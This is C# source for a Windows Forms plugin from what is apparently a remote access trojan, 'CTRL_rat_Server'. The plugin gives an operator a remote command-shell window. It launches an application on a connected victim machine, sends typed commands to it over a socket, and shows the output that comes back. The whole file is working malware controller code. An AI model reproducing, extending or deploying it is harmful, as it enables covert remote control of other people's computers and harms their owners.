using CTRL_rat_Server;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server_plugin_dll
{
    public partial class CMD : Form
    {
        node client;
        CTRL_rat_Server.Main parent;
        string workerid;
        string app_id;
        string wait_id;
        public CMD(node _client, CTRL_rat_Server.Main _parent)
        {
            client = _client;
            parent = _parent;
            workerid = client.generate_random_id();
            InitializeComponent();
        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {
            richTextBox1.Invoke((MethodInvoker)(() =>
            {
                richTextBox1.SelectionStart = richTextBox1.Text.Length;
                richTextBox1.ScrollToCaret();
            }));
            
        }
        public void send_command() 
        {
            var g = client.get_or_create_worker_node(workerid);
            var payload = new Dictionary<object, object>();
            payload["op"] = "reqcommand";
            payload["data"] = textBox1.Text;
            payload["id"] = app_id;
            g.Send(g.sock, Encoding.UTF8.GetBytes(g.DictionaryToJson(payload)));
            clear_inputtextbox();
        }
        private void button1_Click(object sender, EventArgs e)
        {
            send_command();
        }
        public void append_richtext(string text)
        {
            richTextBox1.Invoke((MethodInvoker)(() =>
            {
                richTextBox1.Text += text+"\n";
            }));
        }
        public void clear_richtext()
        {
            richTextBox1.Invoke((MethodInvoker)(() =>
            {
                richTextBox1.Clear();
            }));
        }
        public void clear_inputtextbox()
        {
            textBox1.Invoke((MethodInvoker)(() =>
            {
                textBox1.Clear();
            }));
        }
        public void button_enable(bool e)
        {
            button1.Invoke((MethodInvoker)(() =>
            {
                button1.Enabled = e;
            }));
        }
        public void OnMessage(node _client, Dictionary<object, object> response)
        {
            if (_client.hwid != client.hwid) return;
            if ((string)response["op"] == "retapp")
            {
                if ((string)response["id"] == wait_id) 
                {
                    button_enable(true);
                    app_id = (string)response["data"];
                }

            }
            else if ((string)response["op"] == "retcommand")
            {
                if ((string)response["id"] == app_id)
                {
                    string data = (string)response["data"];
                    append_richtext(data);
                }
            }
        }
        private void button2_Click(object sender, EventArgs e)
        {
            clear_richtext();
            button_enable(false);
            wait_id = client.generate_random_id();
            var g = client.get_or_create_worker_node(workerid);
            var payload = new Dictionary<object, object>();
            payload["op"] = "reqapp";
            payload["app"] = textBox2.Text;
            payload["id"] = wait_id;
            g.Send(g.sock, Encoding.UTF8.GetBytes(g.DictionaryToJson(payload)));
        }

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyData == Keys.Enter)
            {
                send_command();
            }
        }
    }
}
